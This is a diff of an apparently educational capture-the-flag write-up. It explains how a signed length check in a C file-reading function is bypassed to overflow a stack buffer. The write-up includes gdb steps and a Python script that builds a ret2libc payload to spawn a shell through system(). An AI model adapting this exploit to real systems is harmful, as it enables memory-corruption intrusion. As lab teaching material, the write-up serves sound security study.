@@ -51,11 +51,6 @@ Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RU
 
 There is no stack canary and the stack is **not** executable. As we've seen in the previous level, [ASLR is disabled](https://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization) system-wise for this set of challenges.
 
-```bash
-$ cat  /proc/sys/kernel/randomize_va_space
-0
-```
-
 ## 1 - Vulnerability
 
 ```c
@@ -70,14 +65,14 @@ $ cat  /proc/sys/kernel/randomize_va_space
 void head(int len, char *filename) {
 	char buf[256];
 	
-	if (len > 255) {                       [1]
+	if (len > 255) {                         [1]
 		printf("You are insane!\n");
 		return;
 	}
 
 	int fp = open(filename, O_RDONLY);
 
-	if (fp == 0) {                         [2]
+	if (fp == 0) {                           [2]
 		printf("Computer says no\n");
 		return;
 	}
@@ -110,5 +105,98 @@ Now let's see if we can break it:
 * Let's notice that the check at **[2]** is actually not effective because, according to its [man page](http://man7.org/linux/man-pages/man2/open.2.html), _open_ will return -1 in case of error. This means that the program will have unpredictable output for non-existent files.
 * The check at **[1]** poses, however, a more serious risk: as we can see from the definition of the function, _len_ is actually a signed integer. This means that passing any negative value will successfulyl bypass the check, overflow the buffer and everything beyond, including the return address from function _head_.
 
+Although one might expect that a GCC compiler error would be generated in situations like this, it is not actually the case. Moreover, even eanbling _all warnings_ and _extra warnings_ doesn't produce any new message. These flags are actually misleading, since it is not possible (nor desirable!) to show _ALL_ compilation errors supported by GCC. See [here](https://stackoverflow.com/questions/11714827/how-to-turn-on-literally-all-of-gccs-warnings) why. That's why I was saying it is slighly more difficult to spot this class of vulnerabilities in practice. 
+
+```bash
+$ gcc  -m32 -fstack-protector level2.c -o level2       
+$ gcc -Wall -Wextra -m32 -fstack-protector level2.c -o level2
+$ 
+```
+
+The only way to get a warning for this kind of behaviour is to manually enable implicit sign conversions erros, using the **-Wsign-conversion** flag.
+
+```
+-Wsign-conversion
+    Warn for implicit conversions that may change the sign of an integer value, like assigning a signed integer expression to an unsigned integer variable. An explicit cast silences the warning. In C, this option is enabled also by -Wconversion. 
+```
+
+```bash
+$ gcc -Wsign-conversion -m32 -fstack-protector level2.c -o level2
+level2.c: In function ‘head’:
+level2.c:24:20: warning: conversion to ‘size_t {aka unsigned int}’ from ‘int’ may change the sign of the result [-Wsign-conversion]
+  buf[read(fp, buf, len)] = 0; 
+                    ^
+```		    
+
 ## 2 - Exploit 
 
+Given the previous finding, the exploitation is simple and very similar with [level 1](https://livz.github.io/2016/02/16/binary-master-lieutenant-1.html). First we'll see what we need to control the EIP and then we'll introduce a payload as well.
+
+### Controlling theexecution flow
+Although we know that **buf** is 256 bytes in size, we need to see the stack layout of the function **head** in order to understand exactly how many bytes we need to overwrite to get to the saved return address on the stack.
+
+![head stack](/assets/images/bm7-0.png)
+
+So we need 256 + 12 + 4 bytes of padding in the buffer before we'll reach the saved return address. Let's see first if we can reliably control the return address:
+
+```bash
+$ python -c 'print "A"*256 + "BBBB"' > input
+$ gdb -q ./level2
+
+gdb-peda$ run -1 input
+```
+We see below that the execution crashed at address **0x42424242** ("BBBB"). That's good. We can move on.
+
+![Control EIP](/assets/images/bm7-1.png)
+
+### Add ret2libc payload
+In a very similar way with the previous level, we'll return from _head_ function to the system function, and place the argument in an environment variable. All the unchanged details omitted for space. The format of our payload is:
+
+```
+| PADDING (272 bytes) | addr. of system() | addr of exit() | addr of arguments |
+```
+
+The python script below generates the payload according to this scheme:
+
+```python
+import struct                                                                                                      
+from subprocess import call
+
+system = 0xf7e65e70     # Address of system() function
+exit = 0xf7e58f50       # Address of exit() function
+egg = 0xffffd928-6      # Address of environment variable (/home/level2/victory)
+
+payload = "A" * (256 + 12 + 4) + struct.pack("<I", system) + struct.pack("<I", exit) + struct.pack("<I", egg)
+
+open("/tmp/input", "wb").write(payload)
+```
+
+## 3 - Profit
+
+```
+$ python /tmp/gen.py > /tmp/input
+$ /levels/level2 -1 /tmp/input
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp^�P��"��
+   ___  _                      __  ___         __  
+  / _ )(_)__  ___ _______ __  /  |/  /__ ____ / /____ ______ __
+ / _  / / _ \/ _ `/ __/ // / / /|_/ / _ `(_-</ __/ -_) __/ // /
+/____/_/_//_/\_,_/_/  \_, / /_/  /_/\_,_/___/\__/\__/_/  \_, / 
+                     /___/                              /___/  
+                ___           __                   __   
+               / (_)___ __ __/ /____ ___ ___ ____ / /_  
+              / / // -_) // / __/ -_) _ | _ `/ _ | __/  
+             /_/_/ \__/\_,_/\__/\__/_//_|_,_/_//_|__/   
+
+Subject: Victory!
+
+Congrats, you have solved level2. To update your score,
+send an e-mail to unlock@certifiedsecure.com and include:
+   * your CS-ID
+   * which level you solved (level2 @ binary mastery lieutenant)
+   * the exploit 
+   
+You can now start with level3. If you want, you can log in
+as level3 with password     [REDACTED]
+```
+
+That's it for now. It the [next level]() we'll look at a new calss of issues - command injection vulnerabilities.
